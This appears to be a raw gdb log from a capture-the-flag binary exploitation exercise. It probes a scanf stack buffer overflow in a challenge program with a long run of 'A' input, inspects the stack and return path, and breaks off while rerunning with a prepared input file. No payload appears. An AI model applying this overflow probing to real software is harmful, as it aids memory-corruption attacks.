-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040070d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x0000038FD3DFFF78  RDX: 0x0000038FD3DFFF88  RCX: 0x0000000000000000  RIP: 0x0000000000400714
  R8 : 0x000002F1700EEE80  R9 : 0x000002F170104530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400714 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000038FD3DFFD80  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x0000038FD3DFFF78  RDX: 0x0000038FD3DFFF88  RCX: 0x0000000000000000  RIP: 0x000000000040071B
  R8 : 0x000002F1700EEE80  R9 : 0x000002F170104530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071b in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000038FD3DFFD80  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x0000038FD3DFFD80  RDX: 0x0000038FD3DFFF88  RCX: 0x0000000000000000  RIP: 0x000000000040071E
  R8 : 0x000002F1700EEE80  R9 : 0x000002F170104530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040071e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000038FD3DFFD80  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x00000000004007EE  RSI: 0x0000038FD3DFFD80  RDX: 0x0000038FD3DFFF88  RCX: 0x0000000000000000  RIP: 0x0000000000400723
  R8 : 0x000002F1700EEE80  R9 : 0x000002F170104530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400723 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x00000000004007EE  RSI: 0x0000038FD3DFFD80  RDX: 0x0000038FD3DFFF88  RCX: 0x0000000000000000  RIP: 0x0000000000400728
  R8 : 0x000002F1700EEE80  R9 : 0x000002F170104530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400728 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000001  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x000002F1700EE640  RSI: 0x000002F1700EF9F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x000000000040072D
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x0000038FD3DFFE88  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40072d <main+49>:	lea    rax,[rbp-0x110]
   0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040072d in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000038FD3DFFD80  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x000002F1700EE640  RSI: 0x000002F1700EF9F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400734
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x0000038FD3DFFE88  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400734 <main+56>:	mov    rdi,rax
   0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400734 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000038FD3DFFD80  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000038FD3DFFD80  RSI: 0x000002F1700EF9F0  RDX: 0x0000000000000001  RCX: 0x0000000000000000  RIP: 0x0000000000400737
  R8 : 0x0000000000000000  R9 : 0x0000000000000000  R10: 0x0000038FD3DFFE88  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400737 <main+59>:	call   0x400560 <strlen@plt>
   0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400737 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000108  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000038FD3DFFD80  RSI: 0x000000000000FF00  RDX: 0x0000000000000008  RCX: 0xF8EEC0C000000000  RIP: 0x000000000040073C
  R8 : 0x000000000000C0C0  R9 : 0x0000000000000000  R10: 0x0000038FD3DFFE88  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073c <main+64>:	mov    DWORD PTR [rbp-0x4],eax
   0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073c in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000108  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000038FD3DFFD80  RSI: 0x000000000000FF00  RDX: 0x0000000000000008  RCX: 0xF8EEC0C000000000  RIP: 0x000000000040073F
  R8 : 0x000000000000C0C0  R9 : 0x0000000000000000  R10: 0x0000038FD3DFFE88  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40073f <main+67>:	lea    rax,[rbp-0x110]
   0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040073f in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000038FD3DFFD80  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000038FD3DFFD80  RSI: 0x000000000000FF00  RDX: 0x0000000000000008  RCX: 0xF8EEC0C000000000  RIP: 0x0000000000400746
  R8 : 0x000000000000C0C0  R9 : 0x0000000000000000  R10: 0x0000038FD3DFFE88  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400746 <main+74>:	mov    rsi,rax
   0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400746 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000038FD3DFFD80  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000038FD3DFFD80  RSI: 0x0000038FD3DFFD80  RDX: 0x0000000000000008  RCX: 0xF8EEC0C000000000  RIP: 0x0000000000400749
  R8 : 0x000000000000C0C0  R9 : 0x0000000000000000  R10: 0x0000038FD3DFFE88  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400749 <main+77>:	mov    edi,0x4007f1
   0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400749 in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000038FD3DFFD80  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x00000000004007F1  RSI: 0x0000038FD3DFFD80  RDX: 0x0000000000000008  RCX: 0xF8EEC0C000000000  RIP: 0x000000000040074E
  R8 : 0x000000000000C0C0  R9 : 0x0000000000000000  R10: 0x0000038FD3DFFE88  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40074e <main+82>:	mov    eax,0x0
   0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040074e in main ()
gdb$ 
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x00000000004007F1  RSI: 0x0000038FD3DFFD80  RDX: 0x0000000000000008  RCX: 0xF8EEC0C000000000  RIP: 0x0000000000400753
  R8 : 0x000000000000C0C0  R9 : 0x0000000000000000  R10: 0x0000038FD3DFFE88  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400753 <main+87>:	call   0x400580 <printf@plt>
   0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400753 in main ()
gdb$ 
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x000000000000010F  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEF1  RDX: 0x000002F1700EF9E0  RCX: 0x000000000000010E  RIP: 0x0000000000400758
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x000002F1700EC6A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400758 <main+92>:	mov    eax,0x0
   0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400758 in main ()
gdb$ i r
rax            0x10f	0x10f
rbx            0x0	0x0
rcx            0x10e	0x10e
rdx            0x2f1700ef9e0	0x2f1700ef9e0
rsi            0x7ffffef1	0x7ffffef1
rdi            0x1	0x1
rbp            0x38fd3dffe90	0x38fd3dffe90
rsp            0x38fd3dffd70	0x38fd3dffd70
r8             0x4141414141414141	0x4141414141414141
r9             0x4141414141414141	0x4141414141414141
r10            0x2f1700ec6a0	0x2f1700ec6a0
r11            0x246	0x246
r12            0x4005e0	0x4005e0
r13            0x38fd3dfff70	0x38fd3dfff70
r14            0x0	0x0
r15            0x0	0x0
rip            0x400758	0x400758 <main+92>
eflags         0x202	[ IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
gdb$ x/22wx $rsp
0x38fd3dffd70:	0xd3dfff78	0x0000038f	0x00000000	0x00000001
0x38fd3dffd80:	0x41414141	0x41414141	0x41414141	0x41414141
0x38fd3dffd90:	0x41414141	0x41414141	0x41414141	0x41414141
0x38fd3dffda0:	0x41414141	0x41414141	0x41414141	0x41414141
0x38fd3dffdb0:	0x41414141	0x41414141	0x41414141	0x41414141
0x38fd3dffdc0:	0x41414141	0x41414141
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x0000038FD3DFFE90  RSP: 0x0000038FD3DFFD70  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEF1  RDX: 0x000002F1700EF9E0  RCX: 0x000000000000010E  RIP: 0x000000000040075D
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x000002F1700EC6A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40075d <main+97>:	leave  
   0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
   0x40076a <__libc_csu_init+10>:	push   r13
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040075d in main ()
gdb$ x/22wx $rsp
0x38fd3dffd70:	0xd3dfff78	0x0000038f	0x00000000	0x00000001
0x38fd3dffd80:	0x41414141	0x41414141	0x41414141	0x41414141
0x38fd3dffd90:	0x41414141	0x41414141	0x41414141	0x41414141
0x38fd3dffda0:	0x41414141	0x41414141	0x41414141	0x41414141
0x38fd3dffdb0:	0x41414141	0x41414141	0x41414141	0x41414141
0x38fd3dffdc0:	0x41414141	0x41414141
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x0000000000000000  RSP: 0x0000038FD3DFFE98  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEF1  RDX: 0x000002F1700EF9E0  RCX: 0x000000000000010E  RIP: 0x000000000040075E
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x000002F1700EC6A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x40075e <main+98>:	ret    
   0x40075f:	nop
   0x400760 <__libc_csu_init>:	push   r15
   0x400762 <__libc_csu_init+2>:	mov    r15d,edi
   0x400765 <__libc_csu_init+5>:	push   r14
   0x400767 <__libc_csu_init+7>:	mov    r14,rsi
   0x40076a <__libc_csu_init+10>:	push   r13
   0x40076c <__libc_csu_init+12>:	mov    r13,rdx
-----------------------------------------------------------------------------------------------------------------------------
0x000000000040075e in main ()
gdb$ x/22wx $rsp
0x38fd3dffe98:	0x6fd50f45	0x000002f1	0xd3dfff78	0x0000038f
0x38fd3dffea8:	0xd3dfff78	0x0000038f	0x00000001	0x00000001
0x38fd3dffeb8:	0x004006fc	0x00000000	0x00000000	0x00000000
0x38fd3dffec8:	0x50199bcc	0x79d2168f	0x004005e0	0x00000000
0x38fd3dffed8:	0xd3dfff70	0x0000038f	0x00000000	0x00000000
0x38fd3dffee8:	0x00000000	0x00000000
gdb$ x/22wx $rip
0x40075e <main+98>:	0x574190c3	0x41ff8941	0xf6894956	0x89495541
0x40076e <__libc_csu_init+14>:	0x4c5441d5	0x0620258d	0x48550020	0x06202d8d
0x40077e <__libc_csu_init+30>:	0x4c530020	0xdb31e529	0x03fdc148	0x08ec8348
0x40078e <__libc_csu_init+46>:	0xfffd95e8	0xed8548ff	0x1f0f1e74	0x00000084
0x40079e <__libc_csu_init+62>:	0x894c0000	0xf6894cea	0x41ff8944	0x48dc14ff
0x4007ae <__libc_csu_init+78>:	0x4801c383	0xea75eb39
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x0000000000000000  RBX: 0x0000000000000000  RBP: 0x0000000000000000  RSP: 0x0000038FD3DFFEA0  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000000007FFFFEF1  RDX: 0x000002F1700EF9E0  RCX: 0x000000000000010E  RIP: 0x000002F16FD50F45
  R8 : 0x4141414141414141  R9 : 0x4141414141414141  R10: 0x000002F1700EC6A0  R11: 0x0000000000000246  R12: 0x00000000004005E0
  R13: 0x0000038FD3DFFF70  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x2f16fd50f45 <__libc_start_main+245>:	mov    edi,eax
   0x2f16fd50f47 <__libc_start_main+247>:	call   0x2f16fd6b1e0 <__GI_exit>
   0x2f16fd50f4c <__libc_start_main+252>:	xor    edx,edx
   0x2f16fd50f4e <__libc_start_main+254>:	jmp    0x2f16fd50e89 <__libc_start_main+57>
   0x2f16fd50f53 <__libc_start_main+259>:	mov    rax,QWORD PTR [rip+0x3a20f6]        # 0x2f1700f3050 <__libc_pthread_functions+400>
   0x2f16fd50f5a <__libc_start_main+266>:	ror    rax,0x11
   0x2f16fd50f5e <__libc_start_main+270>:	xor    rax,QWORD PTR fs:0x30
   0x2f16fd50f67 <__libc_start_main+279>:	call   rax
-----------------------------------------------------------------------------------------------------------------------------
__libc_start_main (main=0x4006fc <main>, argc=0x1, argv=0x38fd3dfff78, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x38fd3dfff68) at libc-start.c:321
321	libc-start.c: No such file or directory.
gdb$ kill
gdb$ r < /tmp/py
Starting program: /challenge/app-systeme/ch35/ch35 < /tmp/py
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708C40  o d I t s Z a P c 
  RDI: 0x0000000000000001  RSI: 0x000003DBE1708D28  RDX: 0x000003DBE1708D38  RCX: 0x0000000000000000  RIP: 0x0000000000400700
  R8 : 0x0000034E6B3E2E80  R9 : 0x0000034E6B3F8530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400700 <main+4>:	sub    rsp,0x120
   0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
-----------------------------------------------------------------------------------------------------------------------------

Breakpoint 1, 0x0000000000400700 in main ()
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003DBE1708D28  RDX: 0x000003DBE1708D38  RCX: 0x0000000000000000  RIP: 0x0000000000400707
  R8 : 0x0000034E6B3E2E80  R9 : 0x0000034E6B3F8530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
  R13: 0x000003DBE1708D20  R14: 0x0000000000000000  R15: 0x0000000000000000
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B				
-----------------------------------------------------------------------------------------------------------------------[code]
=> 0x400707 <main+11>:	mov    DWORD PTR [rbp-0x114],edi
   0x40070d <main+17>:	mov    QWORD PTR [rbp-0x120],rsi
   0x400714 <main+24>:	lea    rax,[rbp-0x110]
   0x40071b <main+31>:	mov    rsi,rax
   0x40071e <main+34>:	mov    edi,0x4007ee
   0x400723 <main+39>:	mov    eax,0x0
   0x400728 <main+44>:	call   0x4005d0 <__isoc99_scanf@plt>
   0x40072d <main+49>:	lea    rax,[rbp-0x110]
-----------------------------------------------------------------------------------------------------------------------------
0x0000000000400707 in main ()
gdb$ ni
-----------------------------------------------------------------------------------------------------------------------[regs]
  RAX: 0x00000000004006FC  RBX: 0x0000000000000000  RBP: 0x000003DBE1708C40  RSP: 0x000003DBE1708B20  o d I t s z a p c 
  RDI: 0x0000000000000001  RSI: 0x000003DBE1708D28  RDX: 0x000003DBE1708D38  RCX: 0x0000000000000000  RIP: 0x000000000040070D
  R8 : 0x0000034E6B3E2E80  R9 : 0x0000034E6B3F8530  R10: 0x000000000000000D  R11: 0x0000000000000002  R12: 0x00000000004005E0
